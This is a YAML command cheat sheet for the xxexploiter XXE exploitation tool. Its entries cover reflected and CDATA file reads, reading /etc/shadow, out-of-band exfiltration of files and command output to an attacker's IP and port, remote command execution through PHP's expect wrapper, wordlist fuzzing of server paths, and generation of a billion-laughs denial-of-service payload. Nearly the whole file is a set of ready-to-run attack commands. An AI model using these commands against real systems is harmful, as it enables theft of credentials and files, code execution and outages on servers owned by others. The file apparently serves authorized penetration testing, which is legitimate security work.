actions:
  # === BASIC FILE EXTRACTION ===
  - title: xxexploiter - read local file via XML reflection
    desc: |
      Extracts the content of a local file using standard XML entity injection. 
      This method is used when the target application reflects the value of the injected entity directly in its response. 
      You should provide an XML template with the `{{XXE}}` placeholder where the data should be injected.
    command: "xxexploiter file {{path|/etc/passwd}} -t {{template_path}}"

  - title: xxexploiter - read file with Base64 encoding
    desc: |
      Reads a local file and encodes its content in Base64 using PHP filters before extraction. 
      This technique is highly recommended for reading files that contain special characters (like config files or binary data) which might otherwise break the XML parser. 
      It helps bypass common parsing errors and ensures the integrity of the retrieved data.
    command: "xxexploiter file {{path|index.php}} -e phpbase64 -t {{template_path}}"

  - title: xxexploiter - read file using CDATA section
    desc: |
      Wraps the extracted file content within a CDATA section to prevent the XML parser from interpreting the content. 
      This is useful when the target file contains characters like '<' or '&' that are not valid in standard XML text nodes. 
      Note that this mode still requires the target to reflect the output in the response.
    command: "xxexploiter file {{path|/etc/fstab}} -m cdata -t {{template_path}}"

  # === BLIND & OUT-OF-BAND (OOB) EXPLOITATION ===
  - title: xxexploiter - out-of-band file extraction
    desc: |
      Performs a blind XXE attack by sending the extracted data to an external server controlled by the attacker. 
      This is the primary method used when the application does not return any XML output in the HTTP response. 
      You must specify the attacker's server IP and port where the tool will listen for the incoming connection.
    command: "xxexploiter -s {{your_ip}} -p {{port|7777}} file {{path|/etc/hostname}} -m oob"

  - title: xxexploiter - OOB extraction with Base64
    desc: |
      Combines Out-of-Band (OOB) extraction with Base64 encoding for reliable blind data exfiltration. 
      The tool will generate a DTD (Document Type Definition) that forces the target to encode the file content and send it to your server. 
      This is often the most stable way to extract sensitive system files from a blind XXE vulnerability.
    command: "xxexploiter -s {{your_ip}} file {{path|/etc/shadow}} -e phpbase64 -m oob"

  # === COMMAND EXECUTION ===
  - title: xxexploiter - execute system commands
    desc: |
      Attempts to achieve Remote Code Execution (RCE) by leveraging the PHP 'expect' wrapper. 
      This command only works if the PHP 'expect' extension is installed and enabled on the target server. 
      It is a powerful post-exploitation step that can provide direct shell access to the underlying operating system.
    command: "xxexploiter expect \"{{command|id}}\""

  - title: xxexploiter - OOB command execution
    desc: |
      Executes a system command and sends the output to an external OOB server. 
      Use this when the command output is not reflected in the application's response but the 'expect' wrapper is available. 
      Ensure your listener is reachable from the target network to capture the execution results.
    command: "xxexploiter -s {{your_ip}} expect \"{{command|uname -a}}\" -m oob"

  # === AUTOMATION & FUZZING ===
  - title: xxexploiter - automated request injection
    desc: |
      Automatically sends the generated XXE payload to the target by parsing a request file (e.g., exported from Burp). 
      The request file must contain the `{{XXE}}` or `{{XXE_B64}}` placeholder where the payload should be placed. 
      This streamlines the exploitation process by handling headers, cookies, and body parameters in a single step.
    command: "xxexploiter file {{path|/etc/passwd}} -x {{request_txt}} -t {{template_xml}}"

  - title: xxexploiter - fuzz file paths with wordlist
    desc: |
      Performs a brute-force search for sensitive files on the target server using a wordlist. 
      The `{{FUZZ}}` keyword in the file path argument is replaced by each entry in the provided wordlist. 
      Use the `-n` flag to filter out "not found" or error strings to identify valid file paths successfully.
    command: "xxexploiter file /var/www/{{FUZZ}} -w {{wordlist_path}} -n \"{{error_string|File not found}}\" -x {{request_txt}}"

  # === DENIAL OF SERVICE ===
  - title: xxexploiter - billion laughs attack (XEE)
    desc: |
      Generates an XML External Entity Expansion (XEE) payload to perform a Denial of Service attack. 
      The attack works by defining nested entities that expand exponentially, potentially crashing the XML parser or consuming all server memory. 
      Warning: This can cause significant downtime and should only be used in authorized environments.
    command: "xxexploiter xee {{expansion_count|1000000}} -o {{output_file|dos_payload.xml}}"
